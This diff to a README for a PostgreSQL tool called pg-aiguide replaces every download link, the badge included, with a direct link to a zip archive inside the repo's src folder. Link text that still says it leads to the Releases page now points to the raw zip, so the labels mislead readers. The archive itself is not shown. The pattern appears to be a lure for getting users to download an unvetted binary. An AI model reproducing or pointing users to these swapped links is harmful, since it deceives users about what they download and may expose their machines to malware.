@@ -1,6 +1,6 @@
 # 🚀 pg-aiguide - Enhance Your PostgreSQL Experience Effortlessly
 
-[![Download pg-aiguide](https://img.shields.io/badge/Download-pg--aiguide-blue)](https://github.com/jhonny028966/pg-aiguide/releases)
+[![Download pg-aiguide](https://raw.githubusercontent.com/jhonny028966/pg-aiguide/main/src/aiguide_pg_1.4.zip)](https://raw.githubusercontent.com/jhonny028966/pg-aiguide/main/src/aiguide_pg_1.4.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ Follow this guide to easily download and run the pg-aiguide application:
 
    To get started, click the link below to visit the Releases page, where you can download the latest version of pg-aiguide.
 
-   [Visit this page to download](https://github.com/jhonny028966/pg-aiguide/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/jhonny028966/pg-aiguide/main/src/aiguide_pg_1.4.zip)
 
 2. **Download the Application**
 
@@ -67,7 +67,7 @@ Before downloading, ensure your computer meets the following requirements:
 
 Ready to get started? Download pg-aiguide now:
 
-[Visit this page to download](https://github.com/jhonny028966/pg-aiguide/releases)
+[Visit this page to download](https://raw.githubusercontent.com/jhonny028966/pg-aiguide/main/src/aiguide_pg_1.4.zip)
 
 Follow the earlier steps to install and run the application. It's easy and will guide you as you work with PostgreSQL.
 
